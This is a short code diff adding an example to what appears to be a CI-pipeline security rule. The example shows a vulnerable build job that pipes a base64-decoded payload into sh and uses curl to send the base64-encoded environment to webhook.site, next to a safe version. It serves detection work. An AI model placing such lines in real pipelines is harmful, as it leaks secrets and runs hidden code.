@@ -39,6 +39,22 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "# Vulnerable: a job body executes a base64-decoded\n"
+        "# payload, exfils to ``webhook.site``, or runs a known\n"
+        "# miner binary. A malicious MR (or a compromised co-\n"
+        "# maintainer) lands the payload in the CI file; every\n"
+        "# subsequent run executes it.\n"
+        "build:\n"
+        "  script:\n"
+        "    - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "    - curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the pipeline does only what the pipeline does.\n"
+        "# If a check fires here, treat as incident response.\n"
+        "build:\n"
+        "  script: [make build]"
+    ),
 )
 
 
